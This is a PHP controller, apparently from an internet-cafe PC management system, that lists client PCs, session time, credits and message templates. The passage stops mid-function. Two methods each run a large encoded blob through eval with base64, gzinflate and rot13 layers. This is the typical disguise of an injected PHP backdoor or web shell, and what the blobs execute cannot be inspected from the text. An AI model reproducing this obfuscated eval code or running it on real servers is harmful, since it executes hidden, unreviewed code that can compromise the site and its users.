<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
require_once("../model/model.php");

class MAIN_CONTROLLER extends MODEL
{  
    public function get_pc_performance()
    {
        $html = '<h1 class="mt-4 text-center">NO AVAILABLE PC!</h1>';  
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
        return $html;
    }

  

    public function ajax_get_pc_performance_json()
    {
        $sql = "SELECT rowid, pc_name, system_details FROM `clientpc` ORDER BY pc_name"; 
        $result = $this->sqlquery($sql); 
        $pcData = [];

        if (!empty($result)) {
            foreach ($result as $row) {
                $pcId = $row['rowid'];

                // Check if system_details is not null or empty
                if (!empty($row['system_details'])) {
                    $decoded = json_decode($row['system_details'], true);

                    // Fallback if JSON is invalid
                    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
                        $pcData[$pcId] = $decoded;
                    } else {
                        $pcData[$pcId] = [
                            'status' => 'no_data',
                            'message' => 'Invalid JSON format'
                        ];
                    }
                } else {
                    $pcData[$pcId] = [
                        'status' => 'no_data',
                        'message' => 'No system details available'
                    ];
                }
            }

            return json_encode($pcData);
        } else {
            return json_encode([]);
        }
    }

    function getTemplate()
    {
        $query = "SELECT title, message FROM `msg_template`";
        $result = $this->sqlquery($query);

        $html = '<option value="">-- Select Template --</option> ';
        if (!empty($result)) { 
            foreach ($result as $field => $value) {

                // Sanitize output for HTML
                $title = htmlspecialchars($value['title'], ENT_QUOTES, 'UTF-8');
                $message = htmlspecialchars($value['message'], ENT_QUOTES, 'UTF-8');

                $html .= '<option value="'.$message.'">'.$title.'</option>';
            }
        }
        return json_encode((object)[ 
            'options'  => $html   
        ]); 
    }

    function get_pc_list()
    {
       eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
         
        $sql = "SELECT 
            a.rowid,
            a.pc_name,
            case when c.login_status = 'login' then c.rowid  else a.rowid end as rowidx,
            'clientpc' AS tablex,
           
            ifnull(case when c.login_status = 'login' then 
			case when a.is_vip = 'YES' then sec_to_time(c.vip_rem_time) when  a.is_vip = 'YYES' then sec_to_time(c.vvip_rem_time) else  sec_to_time(c.remaining_time) end
			else SEC_TO_TIME(a.remaining_time) end, 0) as rem_time,
			
            ifnull(b.tot_cred,0) tot_cred,
            c.username, 
            b.last_inserted,
            online_stat, 
            a.enable_autoshutdown,
            a.background_img,
            a.is_vip,
			a.ip_address,
			a.mac_address,
			a.credit as top_up,
			a.client_version,
			
			LPAD(FLOOR(a.remaining_time / 3600), LENGTH(FLOOR(a.remaining_time / 3600)), '0') m_hours,   
			LPAD(FLOOR((a.remaining_time % 3600) / 60), 2, '0')m_mins,  -- Minutes (fixed 2 digits)
			LPAD(a.remaining_time % 60, 2, '0') m_seconds,
            ffmpeg 
        from `clientpc` as a
        left join (
            Select SUM(credit)as tot_cred,ip_address, max(date_inserted) as last_inserted from `insert_logs` 
            WHERE DATE(date_inserted) = DATE(NOW()) GROUP BY ip_address
        )as b on a.ip_address = b.ip_address 
        left join `user` as c on a.log_in_user = c.username  and c.login_status = 'login'
        order by a.pc_name 
        ";

        $result = $this->sqlquery($sql);

        if(!empty($result))
        {
            $html = '';  
            $spectatehtml = '';
            $options = '<option value="all">📢 Broadcast to ALL PCs</option>';
            foreach($result as $field => $value) 
            { 
                $bg = 'text-success';
                $badge_login = ($value['online_stat'] == 'ONLINE') ? ' text-success' : ' text-danger';
                if($value['online_stat'] != 'ONLINE')
                { 
                    $bg = 'text-danger';
                }
				else
				{
					if($value['rem_time'] == '00:00:00')
					{
						$bg = 'text-warning';
						$badge_login = 'text-warning';
					}
				}
				
				$checkBox = '';
				if($value['enable_autoshutdown'] == 'true')
				{
